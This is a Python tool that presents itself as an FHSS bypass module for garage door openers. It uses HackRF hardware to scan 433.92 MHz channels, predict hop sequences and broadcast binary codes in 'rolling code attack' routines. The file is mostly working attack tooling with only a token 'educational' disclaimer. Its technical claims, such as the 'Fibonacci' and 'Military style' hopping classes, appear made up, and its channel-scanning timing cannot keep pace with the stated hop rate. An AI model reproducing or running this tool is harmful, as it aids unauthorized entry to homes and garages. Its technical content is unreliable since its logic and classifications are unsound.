#!/usr/bin/env python3
"""
Frequency Hopping Spread Spectrum (FHSS) Bypass Module

Provides specialized functionality for analyzing and bypassing garage door systems
that use Frequency Hopping Spread Spectrum (FHSS) technology for security.
This module implements techniques for detecting hop patterns, predicting next frequencies,
and executing targeted attacks against FHSS garage door systems.

For educational and security research purposes only.
REQUIRES physical HackRF hardware to function.
"""

import os
import sys
import time
import logging
import numpy as np
from typing import List, Dict, Tuple, Optional, Union, Any
from datetime import datetime

# Try importing HackRF - will fail if hardware not available
try:
    import hackrf
except ImportError:
    # We'll handle this gracefully when actual RF operations are attempted
    pass

class FHSSAnalyzer:
    """
    Class for analyzing Frequency Hopping Spread Spectrum (FHSS) signals
    used in some advanced garage door systems.
    """

    def __init__(self, 
                 base_frequency: float = 433.92e6,
                 hop_bandwidth: float = 10e6,
                 num_channels: int = 50,
                 hop_rate: float = 10.0,
                 sample_rate: float = 20e6):
        """
        Initialize the FHSS analyzer.
        
        Args:
            base_frequency: Center frequency in Hz (default: 433.92 MHz)
            hop_bandwidth: Total bandwidth across which hopping occurs (default: 10 MHz)
            num_channels: Number of potential channels in the hop sequence (default: 50)
            hop_rate: Expected hops per second (default: 10)
            sample_rate: Sample rate in Hz (default: 20 MHz)
        """
        self.base_frequency = base_frequency
        self.hop_bandwidth = hop_bandwidth
        self.num_channels = num_channels
        self.hop_rate = hop_rate
        self.sample_rate = sample_rate
        
        # Calculate channel frequencies
        self.channel_width = hop_bandwidth / num_channels
        self.channels = self._calculate_channels()
        
        # Storage for detected hop patterns
        self.detected_patterns = []
        self.current_hop_sequence = []
        self.hop_timestamps = []
        
        # Setup logging
        self._setup_logging()
    
    def _setup_logging(self):
        """Configure logging for the FHSS analyzer."""
        log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        
        # Create logs directory if it doesn't exist
        os.makedirs('logs', exist_ok=True)
        
        # Configure file handler with timestamp
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        log_file = f"logs/fhss_analyzer_{timestamp}.log"
        
        # Set up logging
        logging.basicConfig(
            level=logging.INFO,
            format=log_format,
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
    
    def _calculate_channels(self) -> List[float]:
        """
        Calculate the center frequencies for each hop channel.
        
        Returns:
            List of channel center frequencies in Hz
        """
        start_freq = self.base_frequency - (self.hop_bandwidth / 2)
        return [start_freq + (i * self.channel_width) for i in range(self.num_channels)]
    
    def detect_active_channel(self, 
                             duration: float = 0.1,
                             threshold: float = -50.0) -> Tuple[Optional[int], Optional[float]]:
        """
        Detect which channel is currently active by scanning all possible channels.
        
        Args:
            duration: Scan duration for each channel in seconds (default: 0.1)
            threshold: Signal strength threshold in dB (default: -50.0)
            
        Returns:
            Tuple of (channel_index, signal_strength) for the currently active channel,
            or (None, None) if no active channel was detected
        """
        try:
            # Check if HackRF hardware is available
            if 'hackrf' not in sys.modules:
                logging.error("HackRF module not available. Cannot detect active channels.")
                return None, None
            
            # Open HackRF device
            device = hackrf.HackRF()
            
            max_strength = float('-inf')
            active_channel = None
            
            for i, channel_freq in enumerate(self.channels):
                logging.debug(f"Scanning channel {i} at {channel_freq/1e6:.3f} MHz")
                
                # Configure RX for this channel
                device.set_freq(int(channel_freq))
                device.set_sample_rate(int(self.sample_rate))
                device.set_rx_gain(40)  # Maximum gain
                
                # Start receiving
                device.start_rx_mode()
                
                # Capture samples
                num_samples = int(duration * self.sample_rate)
                samples = device.read_samples(num_samples)
                
                # Calculate signal strength
                # Simple approach: use mean squared amplitude
                signal_power = np.mean(np.abs(samples)**2)
                signal_strength_db = 10 * np.log10(signal_power)
                
                logging.debug(f"  Signal strength: {signal_strength_db:.2f} dB")
                
                if signal_strength_db > max_strength:
                    max_strength = signal_strength_db
                    active_channel = i
            
            # Clean up
            device.stop_rx_mode()
            device.close()
            
            # Check if the signal was strong enough to consider it active
            if max_strength > threshold:
                logging.info(f"Active channel detected: {active_channel} ({self.channels[active_channel]/1e6:.3f} MHz) - Strength: {max_strength:.2f} dB")
                return active_channel, max_strength
            else:
                logging.info(f"No active channel detected. Max strength: {max_strength:.2f} dB")
                return None, None
                
        except Exception as e:
            logging.error(f"Error detecting active channel: {e}")
            return None, None
    
    def scan_for_hop_pattern(self, 
                            duration: float = 10.0,
                            threshold: float = -50.0) -> List[int]:
        """
        Continuously scan for an FHSS hop pattern over the specified duration.
        
        Args:
            duration: Total scan duration in seconds (default: 10.0)
            threshold: Signal strength threshold in dB (default: -50.0)
            
        Returns:
            List of detected channel indices in hop sequence order
        """
        try:
            # Reset detected pattern
            self.current_hop_sequence = []
            self.hop_timestamps = []
            
            # Calculate how many hops we expect to see
            expected_hops = int(duration * self.hop_rate)
            logging.info(f"Scanning for hop pattern - expecting ~{expected_hops} hops over {duration} seconds")
            
            start_time = time.time()
            end_time = start_time + duration
            
            while time.time() < end_time:
                # Detect current active channel
                channel, strength = self.detect_active_channel(
                    duration=0.05,  # Short duration for each scan
                    threshold=threshold
                )
                
                if channel is not None:
                    current_time = time.time()
                    
                    # If we have a previous hop and this is a new one
                    if (len(self.current_hop_sequence) == 0 or 
                        channel != self.current_hop_sequence[-1]):
                        
                        self.current_hop_sequence.append(channel)
                        self.hop_timestamps.append(current_time)
                        
                        logging.info(f"Hop detected to channel {channel} ({self.channels[channel]/1e6:.3f} MHz) at t={current_time-start_time:.3f}s")
                
                # Short delay to prevent overloading the CPU
                time.sleep(0.01)
            
            # Analyze the hop sequence
            if len(self.current_hop_sequence) >= 3:
                logging.info(f"Detected {len(self.current_hop_sequence)} hops in sequence: {self.current_hop_sequence}")
                self._analyze_hop_timing()
                self.detected_patterns.append(self.current_hop_sequence)
                return self.current_hop_sequence
            else:
                logging.warning(f"Insufficient hops detected: {len(self.current_hop_sequence)}")
                return []
                
        except Exception as e:
            logging.error(f"Error scanning for hop pattern: {e}")
            return []
    
    def _analyze_hop_timing(self) -> Optional[float]:
        """
        Analyze timing between frequency hops to determine hop rate.
        
        Returns:
            Estimated hop rate in hops per second, or None if insufficient data
        """
        if len(self.hop_timestamps) < 2:
            return None
            
        # Calculate time deltas between hops
        deltas = [self.hop_timestamps[i+1] - self.hop_timestamps[i] 
                 for i in range(len(self.hop_timestamps)-1)]
        
        # Calculate statistics
        mean_delta = np.mean(deltas)
        std_delta = np.std(deltas)
        estimated_hop_rate = 1.0 / mean_delta
        
        logging.info(f"Hop timing analysis:")
        logging.info(f"  Mean time between hops: {mean_delta:.3f} seconds")
        logging.info(f"  Standard deviation: {std_delta:.3f} seconds")
        logging.info(f"  Estimated hop rate: {estimated_hop_rate:.2f} hops/second")
        
        # Update the hop rate
        if 0.1 <= estimated_hop_rate <= 100:  # Sanity check
            self.hop_rate = estimated_hop_rate
        
        return estimated_hop_rate
    
    def predict_next_hops(self, num_predictions: int = 5) -> List[int]:
        """
        Predict the next channels in the hop sequence based on detected pattern.
        
        Args:
            num_predictions: Number of future hops to predict (default: 5)
            
        Returns:
            List of predicted channel indices for upcoming hops
        """
        if not self.current_hop_sequence:
            logging.warning("No hop sequence available for prediction")
            return []
            
        # If we have a longer sequence, try to identify a repeating pattern
        if len(self.current_hop_sequence) >= 10:
            pattern_length = self._detect_repeating_pattern()
            
            if pattern_length:
                # Use the detected pattern for prediction
                pattern = self.current_hop_sequence[-pattern_length:]
                predictions = []
                
                for i in range(num_predictions):
                    next_idx = i % pattern_length
                    predictions.append(pattern[next_idx])
                
                logging.info(f"Predicted next {num_predictions} hops based on pattern: {predictions}")
                return predictions
        
        # If we don't have a clear pattern, use linear prediction or last seen values
        if len(self.current_hop_sequence) >= 3:
            # Try linear prediction using the differences between consecutive hops
            diffs = [self.current_hop_sequence[i+1] - self.current_hop_sequence[i] 
                   for i in range(len(self.current_hop_sequence)-1)]
            
            if all(d == diffs[0] for d in diffs):
                # Consistent linear pattern
                predictions = []
                last_channel = self.current_hop_sequence[-1]
                
                for i in range(num_predictions):
                    next_channel = (last_channel + diffs[0]) % self.num_channels
                    predictions.append(next_channel)
                    last_channel = next_channel
                
                logging.info(f"Predicted next {num_predictions} hops using linear prediction: {predictions}")
                return predictions
        
        # Fallback: repeat the last detected channels
        backups = []
        for i in range(num_predictions):
            idx = -(i % len(self.current_hop_sequence)) - 1
            backups.append(self.current_hop_sequence[idx])
        
        logging.info(f"Predicted next {num_predictions} hops using fallback method: {backups}")
        return backups
    
    def _detect_repeating_pattern(self) -> Optional[int]:
        """
        Attempt to detect a repeating pattern in the hop sequence.
        
        Returns:
            Length of the repeating pattern, or None if no clear pattern found
        """
        seq = self.current_hop_sequence
        
        # Try different pattern lengths
        for pattern_len in range(2, len(seq) // 2 + 1):
            # Check if the sequence repeats with this pattern length
            is_pattern = True
            
            for i in range(len(seq) - pattern_len):
                if i + pattern_len < len(seq) and seq[i] != seq[i + pattern_len]:
                    is_pattern = False
                    break
            
            if is_pattern:
                logging.info(f"Detected repeating pattern of length {pattern_len}: {seq[:pattern_len]}")
                return pattern_len
        
        return None
    
    def execute_fhss_bypass(self, 
                           code: str,
                           duration: float = 30.0,
                           transmit_power: float = 20.0) -> bool:
        """
        Execute an FHSS bypass attack by broadcasting the code across predicted hop frequencies.
        
        Args:
            code: Binary code to transmit (as a string of '0's and '1's)
            duration: Total attack duration in seconds (default: 30.0)
            transmit_power: Transmission power in dB (default: 20.0)
            
        Returns:
            True if the attack was executed successfully, False otherwise
        """
        try:
            # Check if HackRF hardware is available
            if 'hackrf' not in sys.modules:
                logging.error("HackRF module not available. Cannot execute FHSS bypass.")
                return False
            
            # Make sure we have a hop sequence
            if not self.current_hop_sequence:
                logging.error("No hop sequence detected. Run scan_for_hop_pattern first.")
                return False
            
            # Open HackRF device
            device = hackrf.HackRF()
            device.set_sample_rate(int(self.sample_rate))
            device.set_tx_gain(int(transmit_power))
            
            logging.info(f"Starting FHSS bypass attack for {duration} seconds")
            logging.info(f"Transmitting code: {code}")
            
            # Predict hop sequence for the attack duration
            expected_hops = int(duration * self.hop_rate) + 5  # Add a buffer
            predicted_channels = self.predict_next_hops(num_predictions=expected_hops)
            
            # Prepare code for transmission
            # Convert binary string to samples (simple OOK modulation)
            bit_duration = 0.001  # 1 ms per bit
            samples_per_bit = int(bit_duration * self.sample_rate)
            code_samples = []
            
            for bit in code:
                if bit == '1':
                    # For '1', generate a sine wave at the carrier frequency
                    t = np.arange(samples_per_bit) / self.sample_rate
                    carrier = np.exp(2j * np.pi * 1000 * t)  # 1 kHz tone as baseband
                    code_samples.extend(carrier)
                else:
                    # For '0', transmit nothing (zero amplitude)
                    code_samples.extend(np.zeros(samples_per_bit, dtype=complex))
            
            # Add a short preamble
            preamble = np.ones(samples_per_bit * 10, dtype=complex)
            full_signal = np.concatenate([preamble, code_samples])
            
            # Normalize signal
            full_signal = 0.8 * full_signal / np.max(np.abs(full_signal))
            
            start_time = time.time()
            end_time = start_time + duration
            current_channel_idx = 0
            
            # Execute the attack
            try:
                while time.time() < end_time:
                    # Get the current channel to transmit on
                    channel_idx = predicted_channels[current_channel_idx % len(predicted_channels)]
                    channel_freq = self.channels[channel_idx]
                    
                    logging.info(f"Transmitting on channel {channel_idx} ({channel_freq/1e6:.3f} MHz)")
                    
                    # Configure transmitter for this channel
                    device.set_freq(int(channel_freq))
                    
                    # Start TX mode
                    device.start_tx_mode()
                    
                    # Transmit the signal (repeat a few times)
                    for _ in range(3):
                        device.write_samples(full_signal)
                    
                    # Stop TX before changing frequency
                    device.stop_tx_mode()
                    
                    # Update to next channel in the sequence
                    current_channel_idx += 1
                    
                    # Wait for the expected hop interval (minus processing time)
                    hop_interval = 1.0 / self.hop_rate
                    elapsed = time.time() - start_time
                    next_hop_time = (current_channel_idx * hop_interval) + start_time
                    
                    if next_hop_time > time.time():
                        time.sleep(next_hop_time - time.time())
                
                logging.info(f"FHSS bypass attack completed after {time.time() - start_time:.2f} seconds")
                device.close()
                return True
                
            except Exception as e:
                logging.error(f"Error during transmission: {e}")
                device.stop_tx_mode()
                device.close()
                return False
                
        except Exception as e:
            logging.error(f"Error setting up FHSS bypass: {e}")
            return False

    def detect_fhss_receiver_type(self) -> str:
        """
        Attempt to determine the type of FHSS receiver based on hop pattern characteristics.
        
        Returns:
            String identifying the likely receiver type or protocol
        """
        if not self.current_hop_sequence or len(self.current_hop_sequence) < 5:
            return "Unknown (insufficient data)"
        
        # Look for characteristics in the hop pattern
        hop_diff = [abs(self.current_hop_sequence[i+1] - self.current_hop_sequence[i]) 
                  for i in range(len(self.current_hop_sequence)-1)]
        
        max_diff = max(hop_diff)
        min_diff = min(hop_diff)
        avg_diff = sum(hop_diff) / len(hop_diff)
        
        # Check for recognizable patterns
        if all(d == hop_diff[0] for d in hop_diff):
            if hop_diff[0] == 1:
                return "Sequential Hopping (Common in residential systems)"
            else:
                return f"Fixed-step Hopping, step={hop_diff[0]} (Common in commercial systems)"
        
        elif max_diff >= self.num_channels / 2:
            return "Wide-Jump Hopping (Military style)"
        
        elif all(d <= 3 for d in hop_diff):
            return "Narrow-Band Hopping (Common in automotive systems)"
        
        elif self._is_fibonacci_pattern():
            return "Fibonacci Hopping Pattern (High security systems)"
        
        elif self._is_pseudo_random():
            return "Pseudo-Random Hopping (Modern digital systems)"
        
        return "Unknown pattern type"
    
    def _is_fibonacci_pattern(self) -> bool:
        """Check if the hop pattern follows a Fibonacci-based sequence."""
        if len(self.current_hop_sequence) < 5:
            return False
            
        # Check if each channel is the sum of the previous two, modulo channel count
        for i in range(2, len(self.current_hop_sequence)):
            expected = (self.current_hop_sequence[i-1] + self.current_hop_sequence[i-2]) % self.num_channels
            if self.current_hop_sequence[i] != expected:
                return False
                
        return True
    
    def _is_pseudo_random(self) -> bool:
        """Check if the hop pattern appears to be pseudo-random."""
        if len(self.current_hop_sequence) < 8:
            return False
            
        # Check for repeating sub-patterns
        for pattern_len in range(2, min(6, len(self.current_hop_sequence) // 2)):
            if self._detect_repeating_pattern() is not None:
                return False
                
        # Check distribution of differences
        hop_diff = [abs(self.current_hop_sequence[i+1] - self.current_hop_sequence[i]) 
                  for i in range(len(self.current_hop_sequence)-1)]
                  
        unique_diffs = set(hop_diff)
        
        # If there are several different jump distances, likely pseudo-random
        return len(unique_diffs) >= min(4, len(hop_diff) // 2)


class FHSSBypass:
    """
    Main class for executing FHSS bypass attacks against garage door systems.
    Provides higher-level utilities that build on the FHSSAnalyzer.
    """
    
    def __init__(self, 
                target_frequency: float = 433.92e6,
                hop_bandwidth: float = 10e6,
                num_channels: int = 50):
        """
        Initialize the FHSS Bypass system.
        
        Args:
            target_frequency: Target base frequency in Hz (default: 433.92 MHz)
            hop_bandwidth: Total bandwidth across which hopping occurs (default: 10 MHz)
            num_channels: Number of potential channels in the hop sequence (default: 50)
        """
        self.analyzer = FHSSAnalyzer(
            base_frequency=target_frequency,
            hop_bandwidth=hop_bandwidth,
            num_channels=num_channels
        )
        
        self.captured_codes = []
        self.device_type = "Unknown"
    
    def analyze_target(self, scan_duration: float = 20.0) -> Dict[str, Any]:
        """
        Full analysis of the target FHSS system.
        
        Args:
            scan_duration: Duration to scan for hops in seconds (default: 20.0)
            
        Returns:
            Dictionary with analysis results
        """
        logging.info(f"Starting full FHSS target analysis ({scan_duration} seconds)")
        
        # Scan for hop pattern
        hop_sequence = self.analyzer.scan_for_hop_pattern(duration=scan_duration)
        
        if not hop_sequence:
            return {
                "success": False,
                "message": "No hop pattern detected. Verify the device is active."
            }
        
        # Determine device type
        self.device_type = self.analyzer.detect_fhss_receiver_type()
        
        # Get hop rate
        hop_rate = self.analyzer.hop_rate
        
        # Predict next hops
        next_hops = self.analyzer.predict_next_hops(num_predictions=10)
        
        return {
            "success": True,
            "device_type": self.device_type,
            "hop_sequence": hop_sequence,
            "hop_rate": hop_rate,
            "detected_channels": len(hop_sequence),
            "predicted_next_hops": next_hops,
            "base_frequency": self.analyzer.base_frequency,
            "hop_bandwidth": self.analyzer.hop_bandwidth,
            "channel_width": self.analyzer.channel_width
        }
    
    def execute_rolling_attack(self, 
                              codes: List[str],
                              attack_duration: float = 60.0) -> bool:
        """
        Execute a rolling code attack across the FHSS channels.
        
        Args:
            codes: List of binary codes to try (as strings of '0's and '1's)
            attack_duration: Total attack duration in seconds (default: 60.0)
            
        Returns:
            True if the attack was executed successfully, False otherwise
        """
        logging.info(f"Starting rolling code attack across FHSS channels")
        logging.info(f"Target device type: {self.device_type}")
        logging.info(f"Number of codes to try: {len(codes)}")
        
        if not self.analyzer.current_hop_sequence:
            logging.error("No hop sequence detected. Run analyze_target first.")
            return False
        
        # Implementation strategies vary based on device type
        if "Sequential" in self.device_type:
            return self._attack_sequential_system(codes, attack_duration)
        elif "Fibonacci" in self.device_type:
            return self._attack_fibonacci_system(codes, attack_duration)
        elif "Random" in self.device_type:
            return self._attack_random_system(codes, attack_duration)
        else:
            # Default approach for unknown systems
            return self._attack_generic_system(codes, attack_duration)
    
    def _attack_sequential_system(self, codes: List[str], duration: float) -> bool:
        """Specialized attack for sequential hopping systems."""
        logging.info("Using optimized attack for sequential hopping system")
        
        # For sequential systems, we can predict the exact hop sequence
        time_per_code = duration / len(codes)
        
        for code in codes:
            result = self.analyzer.execute_fhss_bypass(
                code=code,
                duration=time_per_code,
                transmit_power=25.0  # Higher power for better chance of success
            )
            
            if not result:
                logging.warning(f"Attack interrupted during code: {code}")
                return False
        
        return True
    
    def _attack_fibonacci_system(self, codes: List[str], duration: float) -> bool:
        """Specialized attack for Fibonacci pattern hopping systems."""
        logging.info("Using optimized attack for Fibonacci pattern system")
        
        # We need 3-4 hops to confirm the pattern
        scan_time = min(5.0, duration * 0.1)
        self.analyzer.scan_for_hop_pattern(duration=scan_time)
        
        # Remaining time for code transmission
        remaining_time = duration - scan_time
        time_per_code = remaining_time / len(codes)
        
        for code in codes:
            result = self.analyzer.execute_fhss_bypass(
                code=code,
                duration=time_per_code,
                transmit_power=28.0  # Higher power for these sophisticated systems
            )
            
            if not result:
                return False
        
        return True
    
    def _attack_random_system(self, codes: List[str], duration: float) -> bool:
        """Specialized attack for pseudo-random hopping systems."""
        logging.info("Using optimized attack for pseudo-random hopping system")
        
        # These systems require more scanning to identify patterns
        scan_time = min(10.0, duration * 0.2)
        self.analyzer.scan_for_hop_pattern(duration=scan_time)
        
        # For random systems, try broadcasting multiple codes simultaneously
        # by concatenating them
        combined_codes = []
        chunk_size = min(3, len(codes))
        
        for i in range(0, len(codes), chunk_size):
            chunk = codes[i:i+chunk_size]
            combined = ''.join(chunk)
            combined_codes.append(combined)
        
        remaining_time = duration - scan_time
        time_per_combo = remaining_time / len(combined_codes)
        
        for combo in combined_codes:
            result = self.analyzer.execute_fhss_bypass(
                code=combo,
                duration=time_per_combo,
                transmit_power=30.0  # Maximum power for difficult systems
            )
            
            if not result:
                return False
        
        return True
    
    def _attack_generic_system(self, codes: List[str], duration: float) -> bool:
        """Generic attack for unknown hopping systems."""
        logging.info("Using generic attack for unknown hopping system")
        
        # Allocate time based on number of codes
        time_per_code = duration / len(codes)
        
        for code in codes:
            result = self.analyzer.execute_fhss_bypass(
                code=code,
                duration=time_per_code,
                transmit_power=22.0
            )
            
            if not result:
                return False
        
        return True


def main():
    """Main entry point for FHSS bypass tool demonstration."""
    logging.basicConfig(level=logging.INFO)
    
    # Check for HackRF availability
    try:
        import hackrf
        logging.info("HackRF module found")
    except ImportError:
        logging.error("HackRF module not found. FHSS bypass requires HackRF hardware.")
        logging.info("You can still run this script to view its functionality, but no RF operations will work.")
    
    # Parse command line arguments
    import argparse
    parser = argparse.ArgumentParser(description='FHSS Bypass Tool for Garage Door Systems')
    
    parser.add_argument('-f', '--frequency', type=float, default=433.92,
                     help='Target frequency in MHz (default: 433.92)')
    parser.add_argument('-b', '--bandwidth', type=float, default=10.0,
                     help='Hop bandwidth in MHz (default: 10.0)')
    parser.add_argument('-n', '--channels', type=int, default=50,
                     help='Number of hop channels (default: 50)')
    parser.add_argument('-a', '--analyze', action='store_true',
                     help='Run full target analysis')
    parser.add_argument('-d', '--duration', type=float, default=20.0,
                     help='Analysis/attack duration in seconds (default: 20.0)')
    parser.add_argument('-c', '--code', type=str,
                     help='Single binary code to transmit')
    
    args = parser.parse_args()
    
    # Convert MHz to Hz
    target_freq = args.frequency * 1e6
    bandwidth = args.bandwidth * 1e6
    
    # Create the FHSS bypass system
    bypass = FHSSBypass(
        target_frequency=target_freq,
        hop_bandwidth=bandwidth,
        num_channels=args.channels
    )
    
    if args.analyze:
        logging.info(f"Running full FHSS analysis on {args.frequency} MHz")
        results = bypass.analyze_target(scan_duration=args.duration)
        
        if results["success"]:
            logging.info("Analysis completed successfully")
            logging.info(f"Device type: {results['device_type']}")
            logging.info(f"Hop sequence: {results['hop_sequence']}")
            logging.info(f"Hop rate: {results['hop_rate']} hops/second")
            logging.info(f"Predicted next hops: {results['predicted_next_hops']}")
        else:
            logging.error(f"Analysis failed: {results['message']}")
    
    if args.code:
        logging.info(f"Executing FHSS bypass with code: {args.code}")
        
        if not bypass.analyzer.current_hop_sequence:
            logging.info("No hop sequence detected yet, running quick analysis")
            bypass.analyzer.scan_for_hop_pattern(duration=5.0)
        
        result = bypass.analyzer.execute_fhss_bypass(
            code=args.code,
            duration=args.duration
        )
        
        if result:
            logging.info("FHSS bypass executed successfully")
        else:
            logging.error("FHSS bypass failed")
    
    if not args.analyze and not args.code:
        # Demo mode
        logging.info("Running in demo mode (no operations specified)")
        logging.info("Usage examples:")
        logging.info("  Analyze target:  python fhss_bypass.py -f 433.92 -a -d 30.0")
        logging.info("  Execute bypass:  python fhss_bypass.py -f 433.92 -c '101010101010' -d 15.0")
        logging.info("  Custom setup:    python fhss_bypass.py -f 315.0 -b 5.0 -n 32 -a")

if __name__ == "__main__":
    main()